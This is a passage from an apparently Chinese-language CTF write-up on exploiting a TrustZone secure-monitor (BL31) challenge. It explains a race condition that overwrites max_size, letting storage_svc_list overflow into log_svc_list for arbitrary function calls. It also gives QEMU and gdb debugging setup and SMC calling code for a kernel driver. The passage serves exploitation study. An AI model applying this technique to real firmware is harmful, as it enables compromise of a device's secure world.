</span></span><span class="line"><span class="cl">    <span class="nv">attr</span> <span class="o">=</span> 0x2,
</span></span><span class="line"><span class="cl">    <span class="nv">granularity</span> <span class="o">=</span> 0x40000000
</span></span><span class="line"><span class="cl">  <span class="o">}</span>, <span class="o">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">base_pa</span> <span class="o">=</span> 0xe0ab000,
</span></span><span class="line"><span class="cl">    <span class="nv">base_va</span> <span class="o">=</span> 0xe0ab000,
</span></span><span class="line"><span class="cl">    <span class="nv">size</span> <span class="o">=</span> 0x2000,
</span></span><span class="line"><span class="cl">    <span class="nv">attr</span> <span class="o">=</span> 0x42,
</span></span><span class="line"><span class="cl">    <span class="nv">granularity</span> <span class="o">=</span> 0x40000000
</span></span><span class="line"><span class="cl">  <span class="o">}</span>, <span class="o">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">base_pa</span> <span class="o">=</span> 0xe0a0000,
</span></span><span class="line"><span class="cl">    <span class="nv">base_va</span> <span class="o">=</span> 0xe0a0000,
</span></span><span class="line"><span class="cl">    <span class="nv">size</span> <span class="o">=</span> 0x3e000,
</span></span><span class="line"><span class="cl">    <span class="nv">attr</span> <span class="o">=</span> 0xa,
</span></span><span class="line"><span class="cl">    <span class="nv">granularity</span> <span class="o">=</span> 0x40000000
</span></span><span class="line"><span class="cl">  <span class="o">}</span>, <span class="o">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">base_pa</span> <span class="o">=</span> 0xe100000,
</span></span><span class="line"><span class="cl">    <span class="nv">base_va</span> <span class="o">=</span> 0xe100000,
</span></span><span class="line"><span class="cl">    <span class="nv">size</span> <span class="o">=</span> 0xf00000,
</span></span><span class="line"><span class="cl">    <span class="nv">attr</span> <span class="o">=</span> 0xa,
</span></span><span class="line"><span class="cl">    <span class="nv">granularity</span> <span class="o">=</span> 0x40000000
</span></span><span class="line"><span class="cl">  <span class="o">}</span>, <span class="o">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">base_pa</span> <span class="o">=</span> 0x423dc000,
</span></span><span class="line"><span class="cl">    <span class="nv">base_va</span> <span class="o">=</span> 0x423dc000,
</span></span><span class="line"><span class="cl">    <span class="nv">size</span> <span class="o">=</span> 0x1000,
</span></span><span class="line"><span class="cl">    <span class="nv">attr</span> <span class="o">=</span> 0x1a, <span class="c1"># 只有该段内存 attr&amp;MT_NS(0x10) == 1</span>
</span></span><span class="line"><span class="cl">    <span class="nv">granularity</span> <span class="o">=</span> 0x40000000
</span></span><span class="line"><span class="cl">  <span class="o">}</span>, <span class="o">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">base_pa</span> <span class="o">=</span> 0x0,
</span></span><span class="line"><span class="cl">    <span class="nv">base_va</span> <span class="o">=</span> 0x0,
</span></span><span class="line"><span class="cl">    <span class="nv">size</span> <span class="o">=</span> 0x0,
</span></span><span class="line"><span class="cl">    <span class="nv">attr</span> <span class="o">=</span> 0x0,
</span></span><span class="line"><span class="cl">    <span class="nv">granularity</span> <span class="o">=</span> 0x0
</span></span><span class="line"><span class="cl">  <span class="o">}</span>, <span class="o">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">base_pa</span> <span class="o">=</span> 0x0,
</span></span><span class="line"><span class="cl">    <span class="nv">base_va</span> <span class="o">=</span> 0x0,
</span></span><span class="line"><span class="cl">    <span class="nv">size</span> <span class="o">=</span> 0x0,
</span></span><span class="line"><span class="cl">    <span class="nv">attr</span> <span class="o">=</span> 0x0,
</span></span><span class="line"><span class="cl">    <span class="nv">granularity</span> <span class="o">=</span> 0x0
</span></span><span class="line"><span class="cl">  <span class="o">}</span>, <span class="o">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">base_pa</span> <span class="o">=</span> 0x0,
</span></span><span class="line"><span class="cl">    <span class="nv">base_va</span> <span class="o">=</span> 0x0,
</span></span><span class="line"><span class="cl">    <span class="nv">size</span> <span class="o">=</span> 0x0,
</span></span><span class="line"><span class="cl">    <span class="nv">attr</span> <span class="o">=</span> 0x0,
</span></span><span class="line"><span class="cl">    <span class="nv">granularity</span> <span class="o">=</span> 0x0
</span></span><span class="line"><span class="cl">  <span class="o">}}</span></span></span></code></pre></td></tr></table>
</div>
</div>
    </div>
</div>

<script>
function toggleCode(element) {
    const codeContent = element.nextElementSibling;
    if (codeContent.style.display === "none" || codeContent.style.display === "") {
        codeContent.style.display = "block"; 
        codeContent.parentNode.classList.remove("code-has-hidden-child");
    } else {
        codeContent.style.display = "none"; 
        codeContent.parentNode.classList.add("code-has-hidden-child");
    }
}
</script><p>综上可知，只有<code>0x423dc000 ~ 0x423dc000+0x1000</code>为非安全内存。</p>
<h1 id="利用过程">利用过程<a hidden class="anchor" aria-hidden="true" href="#利用过程">#</a></h1>
<p>参考：</p>
<ul>
<li><a href="https://blog.csdn.net/qq_16106195/article/details/133066328#t19">Linux与BL31之间添加SMC实现随机数获取</a></li>
<li><a href="https://xz.aliyun.com/news/17029">第三届阿里云CTF官方Writeup</a></li>
<li><a href="https://cnwangjihe.notion.site/trust_storage-1a32fe66351f80b1a884f80c22aa5137">cnwangjihe师傅的wp</a>（几经辗转联系到佬师要到wp！！！非常感谢！！！）</li>
</ul>
<h2 id="利用思路">利用思路<a hidden class="anchor" aria-hidden="true" href="#利用思路">#</a></h2>
<p>在<code>reset_pLog</code>之后，<code>memcpy</code>前竞争，在<code>pLog-&gt;ptr</code>写入<code>max_size</code>的地址（<code>0xE0D70B0</code>），就可以将字符串写入<code>max_size</code>，从而使<code>STORAGE_SVC_handler</code>写<code>storage_svc_list</code>时能够溢出覆盖到<code>log_svc_list</code>，实现任意函数调用：</p>
<div class="code-block">
    <div class="code-title" onclick="toggleCode(this)">
        
        <span class="code-block-open"><ion-icon name="chevron-down-outline"></ion-icon></span>
        <span class="code-block-close"><ion-icon name="chevron-forward-outline"></ion-icon></ion-icon></span>
        <span>c</span>
    </div>
    <div class="code-content">
        
        <div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="nl">bss</span><span class="p">:</span><span class="mf">000000000E0</span><span class="n">D6C88</span> <span class="o">??</span> <span class="o">??</span> <span class="o">??</span> <span class="o">??</span> <span class="o">??</span> <span class="o">??</span> <span class="o">??</span> <span class="o">??</span> <span class="n">storage_svc_list</span> <span class="kt">storage_svc_t</span> <span class="o">&lt;?&gt;</span>      <span class="p">;</span> <span class="n">DATA</span> <span class="nl">XREF</span><span class="p">:</span> <span class="n">LOG_SVC_init</span><span class="err">↑</span><span class="n">o</span>
</span></span><span class="line"><span class="cl"><span class="nl">bss</span><span class="p">:</span><span class="mf">000000000E0</span><span class="n">D6C88</span> <span class="o">??</span> <span class="o">??</span> <span class="o">??</span> <span class="o">??</span> <span class="o">??</span> <span class="o">??</span> <span class="o">??</span> <span class="o">??</span><span class="err">…</span>                                        <span class="p">;</span> <span class="n">LOG_SVC_handler</span><span class="err">↑</span><span class="n">o</span> <span class="p">...</span>
</span></span><span class="line"><span class="cl"><span class="nl">bss</span><span class="p">:</span><span class="mf">000000000E0</span><span class="n">D6CC8</span> <span class="o">??</span> <span class="o">??</span> <span class="o">??</span> <span class="o">??</span> <span class="o">??</span> <span class="o">??</span> <span class="o">??</span> <span class="o">??</span><span class="err">…</span>                <span class="kt">storage_svc_t</span> <span class="o">&lt;?&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nl">bss</span><span class="p">:</span><span class="mf">000000000E0</span><span class="n">D6D08</span> <span class="o">??</span> <span class="o">??</span> <span class="o">??</span> <span class="o">??</span> <span class="o">??</span> <span class="o">??</span> <span class="o">??</span> <span class="o">??</span><span class="err">…</span>                <span class="kt">storage_svc_t</span> <span class="o">&lt;?&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nl">bss</span><span class="p">:</span><span class="mf">000000000E0</span><span class="n">D6D48</span> <span class="o">??</span> <span class="o">??</span> <span class="o">??</span> <span class="o">??</span> <span class="o">??</span> <span class="o">??</span> <span class="o">??</span> <span class="o">??</span><span class="err">…</span>                <span class="kt">storage_svc_t</span> <span class="o">&lt;?&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nl">bss</span><span class="p">:</span><span class="mf">000000000E0</span><span class="n">D6D88</span> <span class="o">??</span> <span class="o">??</span> <span class="o">??</span> <span class="o">??</span> <span class="o">??</span> <span class="o">??</span> <span class="o">??</span> <span class="o">??</span><span class="err">…</span>                <span class="kt">storage_svc_t</span> <span class="o">&lt;?&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nl">bss</span><span class="p">:</span><span class="mf">000000000E0</span><span class="n">D6DC8</span> <span class="o">??</span> <span class="o">??</span> <span class="o">??</span> <span class="o">??</span> <span class="o">??</span> <span class="o">??</span> <span class="o">??</span> <span class="o">??</span><span class="err">…</span>                <span class="kt">storage_svc_t</span> <span class="o">&lt;?&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nl">bss</span><span class="p">:</span><span class="mf">000000000E0</span><span class="n">D6E08</span> <span class="o">??</span> <span class="o">??</span> <span class="o">??</span> <span class="o">??</span> <span class="o">??</span> <span class="o">??</span> <span class="o">??</span> <span class="o">??</span><span class="err">…</span>                <span class="kt">storage_svc_t</span> <span class="o">&lt;?&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nl">bss</span><span class="p">:</span><span class="mf">000000000E0</span><span class="n">D6E48</span> <span class="o">??</span> <span class="o">??</span> <span class="o">??</span> <span class="o">??</span> <span class="o">??</span> <span class="o">??</span> <span class="o">??</span> <span class="o">??</span><span class="err">…</span>                <span class="kt">storage_svc_t</span> <span class="o">&lt;?&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nl">bss</span><span class="p">:</span><span class="mf">000000000E0</span><span class="n">D6E88</span> <span class="o">??</span> <span class="o">??</span> <span class="o">??</span> <span class="o">??</span> <span class="o">??</span> <span class="o">??</span> <span class="o">??</span> <span class="o">??</span><span class="err">…</span>                <span class="kt">storage_svc_t</span> <span class="o">&lt;?&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nl">bss</span><span class="p">:</span><span class="mf">000000000E0</span><span class="n">D6EC8</span> <span class="o">??</span> <span class="o">??</span> <span class="o">??</span> <span class="o">??</span> <span class="o">??</span> <span class="o">??</span> <span class="o">??</span> <span class="o">??</span><span class="err">…</span>                <span class="kt">storage_svc_t</span> <span class="o">&lt;?&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nl">bss</span><span class="p">:</span><span class="mf">000000000E0</span><span class="n">D6F08</span> <span class="o">??</span> <span class="o">??</span> <span class="o">??</span> <span class="o">??</span> <span class="o">??</span> <span class="o">??</span> <span class="o">??</span> <span class="o">??</span><span class="err">…</span>                <span class="kt">storage_svc_t</span> <span class="o">&lt;?&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nl">bss</span><span class="p">:</span><span class="mf">000000000E0</span><span class="n">D6F48</span> <span class="o">??</span> <span class="o">??</span> <span class="o">??</span> <span class="o">??</span> <span class="o">??</span> <span class="o">??</span> <span class="o">??</span> <span class="o">??</span><span class="err">…</span>                <span class="kt">storage_svc_t</span> <span class="o">&lt;?&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nl">bss</span><span class="p">:</span><span class="mf">000000000E0</span><span class="n">D6F88</span> <span class="o">??</span> <span class="o">??</span> <span class="o">??</span> <span class="o">??</span> <span class="o">??</span> <span class="o">??</span> <span class="o">??</span> <span class="o">??</span><span class="err">…</span>                <span class="kt">storage_svc_t</span> <span class="o">&lt;?&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nl">bss</span><span class="p">:</span><span class="mf">000000000E0</span><span class="n">D6FC8</span> <span class="o">??</span> <span class="o">??</span> <span class="o">??</span> <span class="o">??</span> <span class="o">??</span> <span class="o">??</span> <span class="o">??</span> <span class="o">??</span><span class="err">…</span>                <span class="kt">storage_svc_t</span> <span class="o">&lt;?&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nl">bss</span><span class="p">:</span><span class="mf">000000000E0</span><span class="n">D7008</span> <span class="o">??</span> <span class="o">??</span> <span class="o">??</span> <span class="o">??</span> <span class="o">??</span> <span class="o">??</span> <span class="o">??</span> <span class="o">??</span><span class="err">…</span>                <span class="kt">storage_svc_t</span> <span class="o">&lt;?&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nl">bss</span><span class="p">:</span><span class="mf">000000000E0</span><span class="n">D7048</span> <span class="o">??</span> <span class="o">??</span> <span class="o">??</span> <span class="o">??</span> <span class="o">??</span> <span class="o">??</span> <span class="o">??</span> <span class="o">??</span><span class="err">…</span>                <span class="kt">storage_svc_t</span> <span class="o">&lt;?&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nl">bss</span><span class="p">:</span><span class="mf">000000000E0</span><span class="n">D7088</span> <span class="o">??</span> <span class="o">??</span> <span class="o">??</span> <span class="o">??</span> <span class="o">??</span> <span class="o">??</span> <span class="o">??</span> <span class="o">??</span> <span class="n">log_svc_list</span>    <span class="kt">log_svc_t</span> <span class="o">&lt;?&gt;</span>           <span class="p">;</span> <span class="n">DATA</span> <span class="nl">XREF</span><span class="p">:</span> <span class="n">LOG_SVC_init</span><span class="o">+</span><span class="n">C</span><span class="err">↑</span><span class="n">w</span>
</span></span><span class="line"><span class="cl"><span class="nl">bss</span><span class="p">:</span><span class="mf">000000000E0</span><span class="n">D7088</span> <span class="o">??</span> <span class="o">??</span> <span class="o">??</span> <span class="o">??</span> <span class="o">??</span> <span class="o">??</span> <span class="o">??</span> <span class="o">??</span>                                         <span class="p">;</span> <span class="n">LOG_SVC_handler</span><span class="o">+</span><span class="mi">24</span><span class="err">↑</span><span class="n">r</span> <span class="p">...</span>
</span></span><span class="line"><span class="cl"><span class="nl">bss</span><span class="p">:</span><span class="mf">000000000E0</span><span class="n">D7098</span> <span class="o">??</span> <span class="o">??</span> <span class="o">??</span> <span class="o">??</span> <span class="o">??</span> <span class="o">??</span> <span class="o">??</span> <span class="o">??</span><span class="err">…</span>                <span class="kt">log_svc_t</span> <span class="o">&lt;?&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nl">bss</span><span class="p">:</span><span class="mf">000000000E0</span><span class="n">D70A8</span>                         <span class="p">;</span> <span class="kt">log_err_t</span> <span class="o">*</span><span class="n">pLog</span>
</span></span><span class="line"><span class="cl"><span class="nl">bss</span><span class="p">:</span><span class="mf">000000000E0</span><span class="n">D70A8</span> <span class="o">??</span> <span class="o">??</span> <span class="o">??</span> <span class="o">??</span> <span class="o">??</span> <span class="o">??</span> <span class="o">??</span> <span class="o">??</span> <span class="n">pLog</span>            <span class="o">%</span> <span class="mi">8</span>
</span></span><span class="line"><span class="cl"><span class="nl">bss</span><span class="p">:</span><span class="mf">000000000E0</span><span class="n">D70B0</span>                         <span class="p">;</span> <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">max_size</span>
</span></span><span class="line"><span class="cl"><span class="nl">bss</span><span class="p">:</span><span class="mf">000000000E0</span><span class="n">D70B0</span> <span class="o">??</span> <span class="o">??</span> <span class="o">??</span> <span class="o">??</span> <span class="o">??</span> <span class="o">??</span> <span class="o">??</span> <span class="o">??</span> <span class="n">max_size</span>        <span class="o">%</span> <span class="mi">8</span></span></span></code></pre></td></tr></table>
</div>
</div>
    </div>
</div>

<script>
function toggleCode(element) {
    const codeContent = element.nextElementSibling;
    if (codeContent.style.display === "none" || codeContent.style.display === "") {
        codeContent.style.display = "block"; 
        codeContent.parentNode.classList.remove("code-has-hidden-child");
    } else {
        codeContent.style.display = "none"; 
        codeContent.parentNode.classList.add("code-has-hidden-child");
    }
}
</script><h2 id="调试tips">调试tips<a hidden class="anchor" aria-hidden="true" href="#调试tips">#</a></h2>
<p>本地调试方便传输exp，给虚拟机添加一个共享磁盘：</p>
<div class="code-block">
    <div class="code-title" onclick="toggleCode(this)">
        
        <span class="code-block-open"><ion-icon name="chevron-down-outline"></ion-icon></span>
        <span class="code-block-close"><ion-icon name="chevron-forward-outline"></ion-icon></ion-icon></span>
        <span>bash</span>
    </div>
    <div class="code-content">
        
        <div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># qemu添加参数</span>
</span></span><span class="line"><span class="cl">    -virtfs local,path<span class="o">=</span><span class="si">${</span><span class="nv">PWD</span><span class="si">}</span>,mount_tag<span class="o">=</span>hostshare,security_model<span class="o">=</span>passthrough,id<span class="o">=</span>hostshare</span></span></code></pre></td></tr></table>
</div>
</div>
    </div>
</div>

<script>
function toggleCode(element) {
    const codeContent = element.nextElementSibling;
    if (codeContent.style.display === "none" || codeContent.style.display === "") {
        codeContent.style.display = "block"; 
        codeContent.parentNode.classList.remove("code-has-hidden-child");
    } else {
        codeContent.style.display = "none"; 
        codeContent.parentNode.classList.add("code-has-hidden-child");
    }
}
</script><p>虚拟机内：</p>
<div class="code-block">
    <div class="code-title" onclick="toggleCode(this)">
        
        <span class="code-block-open"><ion-icon name="chevron-down-outline"></ion-icon></span>
        <span class="code-block-close"><ion-icon name="chevron-forward-outline"></ion-icon></ion-icon></span>
        <span>bash</span>
    </div>
    <div class="code-content">
        
        <div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">mkdir /mnt/shared <span class="o">&amp;&amp;</span> mount -t 9p -o <span class="nv">trans</span><span class="o">=</span>virtio hostshare /mnt/shared
</span></span><span class="line"><span class="cl">insmod /mnt/shared/smc_driver.ko
</span></span><span class="line"><span class="cl">cat /proc/modules <span class="c1"># 查看内核驱动地址，用于调试</span>
</span></span><span class="line"><span class="cl">cat /dev/xxx <span class="c1"># open device</span></span></span></code></pre></td></tr></table>
</div>
</div>
    </div>
</div>

<script>
function toggleCode(element) {
    const codeContent = element.nextElementSibling;
    if (codeContent.style.display === "none" || codeContent.style.display === "") {
        codeContent.style.display = "block"; 
        codeContent.parentNode.classList.remove("code-has-hidden-child");
    } else {
        codeContent.style.display = "none"; 
        codeContent.parentNode.classList.add("code-has-hidden-child");
    }
}
</script><p>gdb添加驱动符号表：</p>
<div class="code-block">
    <div class="code-title" onclick="toggleCode(this)">
        
        <span class="code-block-open"><ion-icon name="chevron-down-outline"></ion-icon></span>
        <span class="code-block-close"><ion-icon name="chevron-forward-outline"></ion-icon></ion-icon></span>
        <span>bash</span>
    </div>
    <div class="code-content">
        
        <div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">pwndbg&gt; add-symbol-file ./smc_driver.ko 0xffff80007a870000
</span></span><span class="line"><span class="cl">add symbol table from file <span class="s2">&#34;./smc_driver.ko&#34;</span> at
</span></span><span class="line"><span class="cl">	.text_addr <span class="o">=</span> 0xffff80007a870000
</span></span><span class="line"><span class="cl">Reading symbols from ./smc_driver.ko...</span></span></code></pre></td></tr></table>
</div>
</div>
    </div>
</div>

<script>
function toggleCode(element) {
    const codeContent = element.nextElementSibling;
    if (codeContent.style.display === "none" || codeContent.style.display === "") {
        codeContent.style.display = "block"; 
        codeContent.parentNode.classList.remove("code-has-hidden-child");
    } else {
        codeContent.style.display = "none"; 
        codeContent.parentNode.classList.add("code-has-hidden-child");
    }
}
</script><h2 id="step0-smc指令调用方法">Step0: smc指令调用方法<a hidden class="anchor" aria-hidden="true" href="#step0-smc指令调用方法">#</a></h2>
<p>用户态程序在EL0，内核驱动运行在EL1，由于调用 SMC 指令时需要确保当前 CPU 正在执行在 EL1，故需要在内核层用驱动来完成。可以用<code>arm_smccc_smc</code>接口：</p>
<div class="code-block">
    <div class="code-title" onclick="toggleCode(this)">
        
        <span class="code-block-open"><ion-icon name="chevron-down-outline"></ion-icon></span>
        <span class="code-block-close"><ion-icon name="chevron-forward-outline"></ion-icon></ion-icon></span>
        <span>c</span>
    </div>
    <div class="code-content">
        
        <div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="c1">// 头文件
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="cp">#include</span> <span class="cpf">&#34;linux-6.6/include/linux/arm-smccc.h&#34;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="c1">// 调用举例
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">struct</span> <span class="n">arm_smccc_res</span> <span class="n">res</span> <span class="o">=</span> <span class="p">{</span> <span class="mi">0</span><span class="p">,</span> <span class="p">};</span>
</span></span><span class="line"><span class="cl"><span class="n">usigned</span> <span class="kt">long</span> <span class="n">x1</span><span class="p">,</span> <span class="n">x2</span><span class="p">,</span> <span class="n">x3</span><span class="p">,</span> <span class="n">x4</span><span class="p">,</span> <span class="n">x5</span><span class="p">,</span> <span class="n">x6</span><span class="p">,</span> <span class="n">x7</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nf">arm_smccc_smc</span><span class="p">(</span><span class="n">smc_fid</span><span class="p">,</span> <span class="n">x1</span><span class="p">,</span> <span class="n">x2</span><span class="p">,</span> <span class="n">x3</span><span class="p">,</span> <span class="n">x4</span><span class="p">,</span> <span class="n">x5</span><span class="p">,</span> <span class="n">x6</span><span class="p">,</span> <span class="n">x7</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">res</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nf">pr_info</span><span class="p">(</span><span class="s">&#34;SMC Driver: LOG_SVC_PLOG_SET, res.0 = %lx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">res</span><span class="p">.</span><span class="err">a</span><span class="mi">0</span><span class="p">);</span></span></span></code></pre></td></tr></table>
</div>
</div>
    </div>
</div>

<script>
function toggleCode(element) {
    const codeContent = element.nextElementSibling;
    if (codeContent.style.display === "none" || codeContent.style.display === "") {
        codeContent.style.display = "block"; 
        codeContent.parentNode.classList.remove("code-has-hidden-child");
    } else {
        codeContent.style.display = "none"; 
        codeContent.parentNode.classList.add("code-has-hidden-child");
    }
}
</script><p>或者内联汇编：</p>
<div class="code-block">
    <div class="code-title" onclick="toggleCode(this)">
        
        <span class="code-block-open"><ion-icon name="chevron-down-outline"></ion-icon></span>
        <span class="code-block-close"><ion-icon name="chevron-forward-outline"></ion-icon></ion-icon></span>
        <span>c</span>
    </div>
    <div class="code-content">
        
        <div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="c1">// 内联汇编举例
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">__asm__</span> <span class="nf">__volatile__</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">  <span class="s">&#34;ldr x0, smc_fid</span><span class="se">\n</span><span class="s">&#34;</span>
</span></span><span class="line"><span class="cl">  <span class="s">&#34;mov x1, #0</span><span class="se">\n</span><span class="s">&#34;</span>
</span></span><span class="line"><span class="cl">  <span class="s">&#34;mov x2, #0</span><span class="se">\n</span><span class="s">&#34;</span>
</span></span><span class="line"><span class="cl">  <span class="s">&#34;mov x3, #0</span><span class="se">\n</span><span class="s">&#34;</span>
</span></span><span class="line"><span class="cl">  <span class="p">...</span>
</span></span><span class="line"><span class="cl">  <span class="s">&#34;smc #0</span><span class="se">\n</span><span class="s">&#34;</span>
</span></span><span class="line"><span class="cl">  <span class="s">&#34;b smc_thread_cont</span><span class="se">\n</span><span class="s">&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="s">&#34;smc_fid:</span><span class="se">\n</span><span class="s">&#34;</span>
</span></span><span class="line"><span class="cl">  <span class="s">&#34;.quad 0xC9000031</span><span class="se">\n</span><span class="s">&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="s">&#34;smc_thread_cont:</span><span class="se">\n</span><span class="s">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="p">);</span></span></span></code></pre></td></tr></table>
</div>
</div>
    </div>
</div>

<script>
function toggleCode(element) {
    const codeContent = element.nextElementSibling;
    if (codeContent.style.display === "none" || codeContent.style.display === "") {
        codeContent.style.display = "block"; 
        codeContent.parentNode.classList.remove("code-has-hidden-child");
    } else {
        codeContent.style.display = "none"; 
        codeContent.parentNode.classList.add("code-has-hidden-child");
    }
}
</script><p><code>smc_fid</code>的计算方法参考<a href="arm-trusted-firmware%5Cinclude%5Clib%5Csmccc.h">ATF源码</a>和<a href="http://infocenter.arm.com/help/topic/com.arm.doc.den0028b/ARM_DEN0028B_SMC_Calling_Convention.pdf">SMC Calling Convention</a>文档。</p>
<p><code>STORAGE_SVC</code>的2个<code>smc_fid</code>可以通过逆向直接获得。</p>
<p><code>LOG_SVC</code>的2个<code>smc_fid</code>则需要通过计算得到，根据<code>rt_svc_descs</code>中的信息得知，<code>LOG_SVC</code>的<code>start_oen = end_oen = 7; call_type = 0</code>：</p>
<div class="code-block">
    <div class="code-title" onclick="toggleCode(this)">
        
        <span class="code-block-open"><ion-icon name="chevron-down-outline"></ion-icon></span>
        <span class="code-block-close"><ion-icon name="chevron-forward-outline"></ion-icon></ion-icon></span>
        <span>c</span>
    </div>
    <div class="code-content">
        
        <div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="nl">ROM</span><span class="p">:</span><span class="mf">000000000E0</span><span class="n">AC120</span> <span class="mi">09</span> <span class="mi">09</span> <span class="mo">01</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="n">rt_svc_descs</span>    <span class="kt">rt_svc_desc_t</span> <span class="o">&lt;</span><span class="mi">9</span><span class="p">,</span> <span class="mi">9</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">aStorageSvc</span><span class="p">,</span> <span class="n">STORAGE_SVC_init</span><span class="p">,</span>  <span class="n">STORAGE_SVC_handler</span><span class="o">&gt;</span> <span class="p">;</span> <span class="s">&#34;STORAGE_SVC&#34;</span>
</span></span><span class="line"><span class="cl"><span class="nl">ROM</span><span class="p">:</span><span class="mf">000000000E0</span><span class="n">AC140</span> <span class="mo">07</span> <span class="mo">07</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span><span class="err">…</span>                <span class="kt">rt_svc_desc_t</span> <span class="o">&lt;</span><span class="mi">7</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">aLogSvc</span><span class="p">,</span> <span class="n">LOG_SVC_init</span><span class="p">,</span> <span class="n">LOG_SVC_handler</span><span class="o">&gt;</span> <span class="p">;</span> <span class="s">&#34;LOG_SVC&#34;</span></span></span></code></pre></td></tr></table>
</div>
</div>
    </div>
</div>

<script>
function toggleCode(element) {
    const codeContent = element.nextElementSibling;
    if (codeContent.style.display === "none" || codeContent.style.display === "") {
        codeContent.style.display = "block"; 
        codeContent.parentNode.classList.remove("code-has-hidden-child");
    } else {
        codeContent.style.display = "none"; 
        codeContent.parentNode.classList.add("code-has-hidden-child");
    }
}
</script><p>计算方法如下：</p>
<div class="code-block">
    <div class="code-title" onclick="toggleCode(this)">
        
        <span class="code-block-open"><ion-icon name="chevron-down-outline"></ion-icon></span>
